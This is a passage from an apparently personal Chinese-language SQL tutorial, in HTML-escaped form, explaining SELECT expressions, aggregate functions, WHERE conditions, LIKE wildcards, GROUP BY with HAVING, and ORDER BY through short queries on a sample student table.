&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;查询计算后的值&#34;&gt;查询计算后的值
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT 表达式&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;表达式可以是算术表达式（+、-&amp;hellip;)，字符串常量，函数等等&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面所有Grade减去2的值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;改变查询结果的列标题&#34;&gt;改变查询结果的列标题
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT 列名 别名&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面的Ch列和Nu列，在结果里面使用Chinese和Num显示&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Chinese&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;Number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;去除查询结果的重复行&#34;&gt;去除查询结果的重复行
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT DISTINCT 列名&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果没有使用DISTINCT，默认为ALL&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;聚集函数&#34;&gt;聚集函数
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;聚集函数只处理非空值&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;聚集函数只能用于SELECT语句和CROUP BY中的HAVING子句&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;统计元组个数&#34;&gt;统计元组个数
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;COUNT(*)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;某个元组的一个或者部分取空值的时候，不影响统计结果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面的总数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;统计某一列值的个数&#34;&gt;统计某一列值的个数
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;COUNT(DISTINCT/ALL 列名)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;指定DISTINCT会去重，NULL不计入总数&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;计算某一列值的平均数该列必须为数值型&#34;&gt;计算某一列值的平均数（该列必须为数值型）
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;AVG(DISTINCT/ALL 列名)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面的Grade平均值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AVG&lt;/span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;ALL&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;计算某一列值的总和该列必须为数值型&#34;&gt;计算某一列值的总和（该列必须为数值型）
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SUM(DISTINCT/ALL 列名)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;计算某一列值的最大值最小值&#34;&gt;计算某一列值的最大值/最小值
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;MAX/MIN(DISTINCT/ALL 列名)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;where-条件表达式&#34;&gt;WHERE 条件表达式
&lt;/h3&gt;&lt;h4 id=&#34;比较大小&#34;&gt;比较大小
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;WHERE 列名 运算式&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;常用运算符：=	&amp;gt;	&amp;lt;	&amp;gt;=	&amp;lt;=	!=/&amp;lt;&amp;gt;	!&amp;gt;	!&amp;laquo;/mark&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面所有三年级（Grade=3）的学生的姓名：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg.查询TAB1里面所有学号2300开头学生（Nu&amp;gt;23000）的学生的年级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;23000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;确定范围&#34;&gt;确定范围
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 BETWEEN 最小值 AND 最大值&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 NOT BETWEEN 最小值 AND 最大值&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面年级在1到3之间的学生的姓名：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BETWEEN&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg.查询学号不在23000到24000之间的学生的姓名：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BETWEEN&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;23000&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;24000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;确定集合&#34;&gt;确定集合
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 IN (&amp;lsquo;列值1&amp;rsquo;,&amp;lsquo;列值n&amp;rsquo;)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 NOT IN (&amp;lsquo;列值1&amp;rsquo;,&amp;lsquo;列值n&amp;rsquo;)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查询学号不是23001也不是23002的学生年级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt; (&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;23001&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;23002&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;相当于多重条件查询的=语句&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;字符匹配&#34;&gt;字符匹配
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;百分号 % &lt;/span&gt;	表示任意长度的字符串(类似正则.*)，比如&lt;code&gt;a%b&lt;/code&gt;就是以a开头，b结尾的任意长度字符串&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;下划线 _ &lt;/span&gt;	  表示单个字符，比如&lt;code&gt;a_ _ _b&lt;/code&gt;（不用空格，这里方便看）是以a开头b结尾的长度为5的字符串&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;在ASCII码表里，一个汉字长度为2，需要两个下划线&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;反斜杠 \ &lt;/span&gt; 	  表示转义，跟在 % 和 _ 前面（&lt;code&gt;\%&lt;/code&gt; 、&lt;code&gt;\_&lt;/code&gt;）让他们变成普通字符而非通配符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;使用 ESCAPE &amp;lsquo;符号&amp;rsquo; 设置转义字符，但一般使用反斜杠&lt;/strong&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;根据环境决定要不要加上ESCAPE（有的数据库默认由\转义）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 LIKE &amp;lsquo;字符串&amp;rsquo; ESCAPE &amp;lsquo;\&amp;rsquo;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 NOT LIKE &amp;lsquo;字符串&amp;rsquo; ESCAPE &amp;lsquo;\&amp;rsquo;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1中姓名满足a%i_e的学生的年级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;a%i_e&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;空值查询&#34;&gt;空值查询
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 IS NULL&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 IS NOT NULL&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1中缺少学号的学生的年级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;多重条件查询&#34;&gt;多重条件查询
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 条件表达式1 AND 条件表达式2&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 条件表达式1 OR 条件表达式2&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以把AND和OR组合使用，其中AND优先级大于OR&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;group-by-列名-having-条件表达式&#34;&gt;GROUP BY 列名 HAVING 条件表达式
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;用于将查询结果按某一列或多列的值分组，值相等的为一组&lt;/strong&gt;&lt;/span&gt;
&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;目的是细化聚集函数的作用对象，分组后聚集函数将作用于每一个组，每一组都有一个函数值&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;group-by-列名&#34;&gt;GROUP BY 列名
&lt;/h4&gt;&lt;p&gt;eg.求TAB1表里面各个年级和对应的人数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;,&lt;span style=&#34;color:#c678dd&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;以Grade分组，在每一组中求取Ch的数量&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;group-by-列名-having-筛选条件&#34;&gt;GROUP BY 列名 HAVING 筛选条件
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;HAVING用于从组中选择满足条件的组&lt;/strong&gt;&lt;/mark&gt;
&lt;strong&gt;&lt;mark&gt;WHERE用于从基本表或视图中选择满足条件的元组（注意：WHERE子句不可以接聚集函数）&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.求TAB1表里面各个年级和对应的人数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;,&lt;span style=&#34;color:#c678dd&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; .&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;HAVING&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;以Grade分组，在每一组中求取Ch的数量&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;order-by-次序&#34;&gt;ORDER BY 次序
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;ORDER BY 列名1 列名n ASC&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;ORDER BY 列名1 列名n DESC&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果不设置，默认升序（ASC）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1中学生的年级，按照降序排列：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ORDER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;DESC&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;连接查询&#34;&gt;连接查询
&lt;/h3&gt;&lt;h4 id=&#34;两表连接查询&#34;&gt;两表连接查询
